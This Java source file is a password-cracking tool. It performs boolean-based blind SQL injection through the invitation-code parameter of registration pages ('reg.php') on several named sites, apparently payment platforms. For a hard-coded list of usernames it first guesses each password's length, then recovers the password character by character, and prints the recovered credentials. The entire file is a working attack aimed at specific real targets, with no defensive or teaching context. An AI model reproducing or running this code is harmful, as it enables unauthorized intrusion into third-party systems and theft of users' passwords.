package com.smile.azxx.crack;

import com.smile.azxx.util.HttpClientUtil;
import org.apache.commons.collections.MapUtils;
import org.apache.commons.lang.StringUtils;

import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

/**
 * Created by smile on 2018/5/28.
 */
public class PwdTwoCrackUtil {

    static String[] codes = {"1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
            "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",".","-","+","*"," ",","};

    static Map<String,String> resultMap = new HashMap<>();

    static String targetUrl = "pingancaixian.cn";
    public static void main(String[] args) {
        String url = "http://pingancaixian.cn/pc//reg.php";//卡卡内支付
//        String url = "http://www.cd16888.com/pc/reg.php";//卡卡内支付
//        String url = "http://dcj2.cn/pc/reg.php";//永恒内支付
//        String url = "http://am321.cn/pc/reg.php";//悠悠内支付
//        String url = "http://www.e0ecr.cn/pc/reg.php";//燕府内支付
//        String url = "http://rai68.cn/pc/reg.php";//华南内支付
//        String url = "http://xindinghui.xqx6.cn/pc/reg.php";//战狼内支付
//        String url = "http://ll2j.cn小小小王/pc/reg.php";//战狼内支付
//        String url = "http://tt20.kongbaobiz.com/pc/reg.php";//路飞
//        String url = "http://www.145syw.cn/pc/reg.php";//死神
        String names = "lijf115/军军军/719232224/xom222333/天道酬勤/大兵/李嘉诚/2834502308/canglang/花开半夏/无敌星/途者/dada9998/13824746508/聚财/桥/千万发哥/醉过/boss/";
        String[] nameArr = names.split("/");
        for (int i = 0; i < nameArr.length; i++) {
            if(StringUtils.isNotBlank(nameArr[i]))
                crackPwd(url,nameArr[i]);
        }

    }


    public static void crackPwd(String url,String name){
//        String name = "1312789937\n";//
        name = name.replace("\n","");
        System.out.println(name.replace("\n",""));
        String result = "";

        int codeLength = getCodeLength(url,name);
        System.out.println("猜解密码长度>>>"+codeLength);
        if(codeLength>0){
            for (int i = 1; i <= codeLength; i++) {
                System.out.println("猜解密码第"+i+"位密码>>>>");
                for (int j = 0; j < codes.length; j++) {
                    String code = result+codes[j];
                    boolean b = isCorrect(url,code,name,i);
                    if(b){
                        System.out.println(code);
                        result = code;
                        break;
                    }
                }
            }
            System.out.println("密码破解成功："+result);
            resultMap.put(name,result);
            printMap(resultMap);
        }else{
            System.out.println("猜解密码长度失败！");
        }
    }


    static void printMap(Map<String,String> params){
        if (!MapUtils.isEmpty(params)) {
            for (Iterator iter = params.keySet().iterator(); iter.hasNext(); ) {
                String name = (String) iter.next();
                String value = String.valueOf(params.get(name));
                System.out.println(name +"\t"+value);
            }
        }
    }

    public static int getCodeLength(String url, String name) {
        int result = 0;
        for (int i = 1; i < 17; i++) {
            Map<String, String> params = new HashMap<>();
            params.put("name", "1");
            params.put("nikname", "1");
            params.put("pass", "123123");
            params.put("add", "创建账号");
            params.put("yqm","ab'or((select length(pass) from user where name=\"" + name + "\" )=" + i + ")or'b'='c");
            System.out.println("ab'or((select length(pass) from user where name=\"" + name + "\" )=" + i + ")or'b'='c");
            String respose = HttpClientUtil.doPostProxy(url, params,targetUrl);
            if (!respose.contains("邀请码不存在")) {
                result = i;
                break;
            }

        }

        return result;
    }

    public static boolean isCorrect(String url, String code, String name,int index) {
        Map<String, String> params = new HashMap<>();
        params.put("name", "1");
        params.put("nikname", "1");
        params.put("pass", "123123");
        params.put("add", "创建账号");
        params.put("yqm", "ab'or((select left(pass,"+index+") from user where name=\"" + name + "\" )=\""+code+"\")or'b'='c");
        System.out.println(params.get("yqm"));
        String respose = HttpClientUtil.doPostProxy(url, params,targetUrl);
        if (respose.contains("邀请码不存在"))
            return false;
        else
            return true;
    }
}
